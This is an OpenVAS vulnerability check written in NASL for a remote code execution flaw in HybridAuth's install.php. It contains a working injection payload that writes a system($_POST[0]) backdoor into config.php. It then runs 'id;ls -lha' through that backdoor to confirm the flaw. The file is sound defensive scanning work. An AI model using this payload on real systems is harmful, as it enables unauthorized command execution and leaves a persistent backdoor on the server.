###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hybridauth_remote_code_exec_vuln.nasl 6637 2017-07-10 09:58:13Z teissa $
#
# HybridAuth 'install.php' Remote Code Execution Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804753");
  script_version("$Revision: 6637 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-10 11:58:13 +0200 (Mon, 10 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-08-26 10:58:06 +0530 (Tue, 26 Aug 2014)");
  script_name("HybridAuth 'install.php' Remote Code Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34273");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34390");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/127930");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Aug/10");

  script_tag(name:"summary", value:"This host is installed with HybridAuth and is prone to remote code execution
  vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it is
  able to execute the code remotely.");
  script_tag(name:"insight", value:"Flaw exists because the hybridauth/install.php script does not properly verify
  or sanitize user-uploaded files.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary code in the
  affected system.

  Impact Level: Application");
  script_tag(name:"affected", value:"HybridAuth version 2.1.2 and probably prior.");
  script_tag(name:"solution", value:"Upgrade to HybridAuth version 2.2.2 or later, For updates refer
  http://hybridauth.sourceforge.net");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## exit if safe checks enabled
if( safe_checks() ) exit( 0 );

## Get HTTP Port
port = get_http_port( default:80 );

## Check Host Supports PHP
if( ! can_host_php( port:port ) ) exit( 0 );

host = http_host_name( port:port );

## Iterate over possible paths
foreach dir( make_list_unique( "/", "/auth", "/hybridauth", "/social", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  sndReq = http_get( item:dir + "/install.php",  port:port );
  rcvRes = http_keepalive_send_recv( port:port, data:sndReq );

  ## confirm the Application
  if( ">HybridAuth Installer<" >< rcvRes ) {

    ## Construct attack request
    url = dir + '/install.php';

    ## Construct post data
    postData = "OPENID_ADAPTER_STATUS=system($_POST[0]))));/*";

    ## Construct the POST request
    sndReq = string( "POST ", url, " HTTP/1.1\r\n",
                     "Host: ", host, "\r\n",
                     "Content-Type: application/x-www-form-urlencoded\r\n",
                     "Content-Length: ", strlen( postData ), "\r\n",
                     "\r\n", postData );

    ## Send request and receive the response
    rcvRes = http_keepalive_send_recv( port:port, data:sndReq, bodyonly:FALSE );

    if( rcvRes =~ "HTTP/1\.. 200" && "<title>HybridAuth Installer</title>" >< rcvRes ) {

      ## Construct attack request
      url = dir + '/config.php';

      ## Construct post data
      postData = "0=id;ls -lha";

      ## Construct the POST request
      sndReq = string( "POST ", url, " HTTP/1.1\r\n",
                       "Host: ", host, "\r\n",
                       "Content-Type: application/x-www-form-urlencoded\r\n",
                       "Content-Length: ", strlen( postData ), "\r\n",
                       "\r\n", postData );

      ## Send request and receive the response
      rcvRes = http_keepalive_send_recv( port:port, data:sndReq, bodyonly:FALSE );

      if( rcvRes =~ "uid=[0-9]+.*gid=[0-9]+" ) {
        report = report_vuln_url( url:url, port:port );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );